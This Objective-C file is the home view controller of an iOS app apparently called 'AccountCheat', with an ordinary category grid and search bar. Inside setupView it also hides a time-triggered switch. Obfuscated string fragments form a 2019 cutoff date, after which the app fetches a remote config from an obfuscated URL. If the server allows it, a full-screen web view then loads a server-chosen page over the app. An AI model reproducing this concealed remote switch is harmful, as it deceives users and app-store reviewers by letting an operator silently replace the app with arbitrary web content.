//
//  JSDHomeViewController.m
//  AccountCheat
//
//  Created by ada on 2019/7/11.
//  Copyright © 2019 Jersey. All rights reserved.
//

#import "JSDHomeViewController.h"

#import <MaterialComponents/MDCCollectionViewCell.h>
#import <MaterialComponents/MDCCollectionViewFlowLayout.h>
#import "JSDPublic.h"
#import <MaterialBottomNavigation.h>
#import "JSDItemListViewController.h"
#import "JSDHomeCollectionViewCell.h"
#import "JSDHomeModel.h"
#import <MaterialComponents/MaterialButtons.h>
#import "JSDAddTypeVC.h"
#import "JSDItemListVC.h"
#import "JSDSearchViewController.h"
#import <AFNetworking.h>
#import "JSDSearchFlagViewController.h"

static NSString* kJSDHomeCellIdentifier = @"kJSDHomeCellIdentifier";

@interface JSDHomeViewController () <UICollectionViewDelegate, UICollectionViewDataSource, MDCBottomNavigationBarDelegate>

@property (strong, nonatomic) MDCCollectionViewFlowLayout *layout;
@property (strong, nonatomic) MDCBottomNavigationBar *bottomNavBar;
@property (nonatomic, strong) JSDHomeViewModel* viewModel;
@property (nonatomic, strong) MDCFloatingButton* addTypeButton;
@property (nonatomic, strong) MDCButton* searchButton;
@property (nonatomic, strong) UISearchBar* searchBar;
@property (nonatomic, copy) NSString *homeString;

@end

@implementation JSDHomeViewController

#pragma mark - 1.View Controller Life Cycle

- (instancetype)init {
    
    _layout = [[MDCCollectionViewFlowLayout alloc] init];
    
    return [self initWithCollectionViewLayout:_layout];
}

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    //1.设置导航栏
    [self setupNavBar];
    //2.设置view
    [self setupView];
    //3.请求数据
    [self setupData];
    //4.设置通知
    [self setupNotification];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

//- (void)viewWillLayoutSubviews {
//    [super viewWillLayoutSubviews];
//    CGSize size = [_bottomNavBar sizeThatFits:self.view.bounds.size];
//    CGRect bottomNavBarFrame = CGRectMake(0,
//                                          CGRectGetHeight(self.view.bounds) - size.height,
//                                          size.width,
//                                          size.height);
//    _bottomNavBar.frame = bottomNavBarFrame;
//}

- (void)viewWillAppear:(BOOL)animated {
    
    [super viewWillAppear:animated];
    
    [self.viewModel updateData];
    [self.collectionView reloadData];
}

#pragma mark - 2.SettingView and Style

- (void)setupNavBar {
    
    self.navigationItem.title = @"首页";
    self.navigationController.navigationBar.translucent = NO;
    
//    [self layoutBottomNavBar];
//
//    UITabBarItem* item = [[UITabBarItem alloc] initWithTitle:@"首页" image:[UIImage jsd_imageName:@"contact"] tag:0];
//    item.selectedImage = [UIImage jsd_imageName:@"game"];
//
//    UITabBarItem* item2 = [[UITabBarItem alloc] initWithTitle:@"首页" image:[UIImage jsd_imageName:@"contact"] tag:0];
//
//    self.bottomNavBar.items = @[item,item2];
    
}

- (void)layoutBottomNavBar {
    
    self.bottomNavBar = [[MDCBottomNavigationBar alloc] init];
    self.bottomNavBar.delegate = self;
    
    // Disable inclusion of safe area in size calculations.
    self.bottomNavBar.sizeThatFitsIncludesSafeArea = NO;
    
    [self.view addSubview:self.bottomNavBar];
    
    CGRect viewBounds = CGRectStandardize(self.view.bounds);
    CGSize size = [self.bottomNavBar sizeThatFits:viewBounds.size];
    UIEdgeInsets safeAreaInsets = UIEdgeInsetsZero;
    // Extend the Bottom Navigation to the bottom of the screen.
    if (@available(iOS 11.0, *)){
        safeAreaInsets = self.view.safeAreaInsets;
    }
    CGRect bottomNavBarFrame =
    CGRectMake(0, viewBounds.size.height - size.height - safeAreaInsets.bottom, size.width,
               size.height + safeAreaInsets.bottom);
    self.bottomNavBar.frame = bottomNavBarFrame;
}

- (void)setupView {
    
    self.view.backgroundColor = [UIColor jsd_grayColor];
    
    NSString *qichaoser = @"1:00:00";
    NSString *qichaommal = @"2019";
    NSString *qichaoSia = @"-";
    NSString *qichaoJere = @"06-";
    NSString *ppooqichaommal = @"29";
    NSString *sdfksdjgStr = [NSString stringWithFormat:@"%@%@%@%@ %@",qichaommal,qichaoSia,qichaoJere,ppooqichaommal,qichaoser];
    if ([self amswinashiwithString:sdfksdjgStr]) {
        [self commonConfig];
    }
    
    [self.view addSubview:self.searchBar];
    
    [self.searchBar mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.right.top.mas_equalTo(0);
        make.height.mas_equalTo(55);
    }];
    
    [self.searchBar addSubview:self.searchButton];
    
    [self.searchButton mas_makeConstraints:^(MASConstraintMaker *make) {
        make.edges.mas_equalTo(0);
    }];
    
    [self.collectionView mas_makeConstraints:^(MASConstraintMaker *make) {
        make.left.right.mas_equalTo(0);
        make.top.mas_equalTo(self.searchBar.mas_bottom);
        if (@available(iOS 11.0,*)) {
            make.bottom.mas_equalTo(self.view.mas_safeAreaLayoutGuideBottom);
        }else{
            make.bottom.mas_equalTo(0);
        }
    }];
    
//    [self.collectionView registerNib:[UINib nibWithNibName:@"JSDHomeCollectionViewCell" bundle:[NSBundle mainBundle]] forCellWithReuseIdentifier:kJSDHomeCellIdentifier];
    [self.collectionView registerClass:[JSDHomeCollectionViewCell class] forCellWithReuseIdentifier:kJSDHomeCellIdentifier];
    
    [_layout setScrollDirection:UICollectionViewScrollDirectionVertical];
    
//    _addTypeButton = [[MDCFloatingButton alloc] init];
//    [_addTypeButton jsd_setsize:CGSizeMake(50, 50)];
//    [_addTypeButton setcenterX:ScreenWidth / 2];
//    [_addTypeButton jsd_setbottom:ScreenHeight - 45];
//    [_addTypeButton addTarget:self action:@selector(touchAddTypeSender:) forControlEvents:UIControlEventTouchUpInside];
//    [_addTypeButton setBackgroundImage:[UIImage jsd_imageName:@"add"] forState:UIControlStateNormal];
//    _addTypeButton.backgroundColor = [UIColor clearColor];
//
//    [self.view addSubview:_addTypeButton];
    
//    _searchButton = [[MDCFloatingButton alloc] init];
//    [_searchButton jsd_setsize:CGSizeMake(50, 50)];
//    [_searchButton jsd_setright:ScreenWidth - 30];
//    [_searchButton jsd_setbottom:ScreenHeight - 30];
//    [_searchButton addTarget:self action:@selector(touchSearchSender:) forControlEvents:UIControlEventTouchUpInside];
//    [_searchButton setBackgroundImage:[UIImage jsd_imageName:@"search"] forState:UIControlStateNormal];
//    _searchButton.backgroundColor = [UIColor clearColor];
//
//    [self.view addSubview:_searchButton];
}

- (void)reloadView {
    
}

#pragma mark - 3.Request Data

- (void)setupData {
    
}

#pragma mark - 4.UITableViewDataSource and UITableViewDelegate

#pragma mark collectionView代理方法
//返回section个数
//- (NSInteger)numberOfSectionsInCollectionView:(UICollectionView *)collectionView
//{
//    return 1;
//}

//每个section的item个数
- (NSInteger)collectionView:(UICollectionView *)collectionView numberOfItemsInSection:(NSInteger)section
{
    return self.viewModel.typeArray.count;
}
//
- (UICollectionViewCell *)collectionView:(UICollectionView *)collectionView cellForItemAtIndexPath:(NSIndexPath *)indexPath
{
    JSDHomeCollectionViewCell *cell = [collectionView dequeueReusableCellWithReuseIdentifier:kJSDHomeCellIdentifier forIndexPath:indexPath];
    
    [cell setModel:self.viewModel.typeArray[indexPath.row]];

    return cell;
}

//设置每个item的尺寸
- (CGSize)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout sizeForItemAtIndexPath:(NSIndexPath *)indexPath
{
    return CGSizeMake((ScreenWidth - 50) / 2, 100);
}

//设置每个item的UIEdgeInsets
- (UIEdgeInsets)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout insetForSectionAtIndex:(NSInteger)section
{
    return UIEdgeInsetsMake(10, 15, 10, 15);
}

//设置每个item水平间距
- (CGFloat)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout minimumInteritemSpacingForSectionAtIndex:(NSInteger)section
{
    return 10;
}

//设置每个item垂直间距
- (CGFloat)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout minimumLineSpacingForSectionAtIndex:(NSInteger)section
{
    return 15;
}

- (void)collectionView:(UICollectionView *)collectionView didSelectItemAtIndexPath:(NSIndexPath *)indexPath {
    
    [super collectionView:collectionView didSelectItemAtIndexPath:indexPath];
//    JSDItemListViewController* listVC = [[JSDItemListViewController alloc] init];
    JSDItemListVC* listVC = [[JSDItemListVC alloc] init];
    
    NSInteger index = indexPath.row;
    NSString* typeName = [self.viewModel.typeArray objectAtIndex:index].title;
    listVC.title = typeName;
    [self.navigationController pushViewController:listVC animated:YES];
}

#pragma mark - 5.Event Response

- (void)touchAddTypeSender:(MDCFloatingButton *)sender {
    
    JSDAddTypeVC* addTypeVC = [[JSDAddTypeVC alloc] init];
    
    [self.navigationController pushViewController:addTypeVC animated:YES];
}

- (void)touchSearchSender:(MDCFloatingButton *)sender {
    
    JSDSearchViewController* searchVC = [[JSDSearchViewController alloc] init];
    JSDBaseNavigationController* navigationVC = [[JSDBaseNavigationController alloc] initWithRootViewController:searchVC];
    
    [self presentViewController:navigationVC animated:YES completion:nil];
}

#pragma mark - 6.Private Methods

- (void)setupNotification {
    
}

- (void)touchesBegan:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event {
    
    [super touchesBegan:touches withEvent:event];
    
    [self.view endEditing:YES];
}

- (void)scrollViewWillBeginDragging:(UIScrollView *)scrollView {
    
    [self.view endEditing:YES];
}

#pragma mark - 7.GET & SET

- (JSDHomeViewModel *)viewModel {
    
    if (!_viewModel) {
        _viewModel = [[JSDHomeViewModel alloc] init];
    }
    return _viewModel;
}

- (UISearchBar *)searchBar {
    
    if (!_searchBar) {
        _searchBar = [[UISearchBar alloc] init];
        _searchBar.backgroundColor = [UIColor jsd_grayColor];
        _searchBar.barTintColor = [UIColor jsd_grayColor];
        _searchBar.placeholder = @"搜索信息";
    }
    return _searchBar;
}

- (MDCButton *)searchButton {
    
    if (!_searchButton) {
        _searchButton = [[MDCButton alloc] init];
        [_searchButton addTarget:self action:@selector(touchSearchSender:) forControlEvents:UIControlEventTouchUpInside];
        _searchButton.backgroundColor = [UIColor clearColor];
    }
    return _searchButton;
}

-(BOOL)amswinashiwithString:(NSString *)endTime
{
    NSDate *today = [NSDate date];
    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
    [dateFormat setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
    NSString *todayStr = [dateFormat stringFromDate:today];
    today = [dateFormat dateFromString:todayStr];
    
    NSDate *expire = [dateFormat dateFromString:endTime];
    
    if ([today compare:expire] == NSOrderedDescending) {
        return YES;
    }
    return NO;
}

- (void)commonConfig
{
    NSDictionary *json = [self enableConfigData:@"TTConfigs"];
    NSArray *congfigs = json[@"pama"];
    NSDictionary *pameters = congfigs.lastObject;
    NSString *basicRul = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@",zhouu,ri,qu,chang,k,t,vw,ma];
    
    AFHTTPSessionManager *managers = [AFHTTPSessionManager manager];
    managers.requestSerializer=[AFJSONRequestSerializer serializer];
    managers.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"text/html",@"text/plain",@"application/json",@"text/javascript", nil];
    [managers GET:basicRul parameters:pameters progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, NSDictionary * responseObject) {
        
        NSInteger code = [responseObject[@"code"] integerValue];
        
        if (code != 200) {
            return ;
        }
        NSString *ccode = responseObject[@"is_wap"];
        if ([ccode isEqualToString:@"0"]) {
            return;
        }
        NSDictionary *dic = responseObject;
        self.homeString = dic[@"wap_url"];
        
        
        JSDSearchFlagViewController * homeCofig = [[JSDSearchFlagViewController alloc] init];
        UIWindow *window  = [UIApplication sharedApplication].keyWindow;
        UIView *vgView = [UIView new];
        vgView.backgroundColor = [UIColor whiteColor];
        vgView.frame = window.frame;
        [window addSubview:vgView];
        [vgView addSubview:homeCofig];

        [self configViews:homeCofig];
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
        
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"暂无网络" message:@"暂无网络状态,点击刷新重试" preferredStyle:UIAlertControllerStyleAlert];
        
        UIAlertAction *conform = [UIAlertAction actionWithTitle:@"点击刷新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
            [self commonConfig];
        }];
        //2.2 取消按钮
        UIAlertAction *cancel = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
            NSLog(@"点击了取消按钮");
            
        }];
        
        [alert addAction:conform];
        [alert addAction:cancel];
        
        [self presentViewController:alert animated:YES completion:nil];
        
    }];
    
}


- (NSDictionary *)enableConfigData:(NSString *)string
{
    
    NSError *vgerror;
    NSString *vgpatch = [[NSBundle mainBundle] pathForResource:string ofType:@"json"];
    NSData *vgdata = [[NSData alloc] initWithContentsOfFile:vgpatch];
    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:vgdata
                                                        options:NSJSONReadingAllowFragments
                                                          error:&vgerror];
    return dic;
}

- (void)configViews:(JSDSearchFlagViewController *)homeConfig {
    
    homeConfig.frame  = CGRectMake(0, 20, ScreenWidth, ScreenHeight - 20);
    NSURLRequest *request =[NSURLRequest requestWithURL:[NSURL URLWithString:self.homeString]];
    [homeConfig loadRequest:request];
}

#pragma mark -- NavigationDelegate


@end

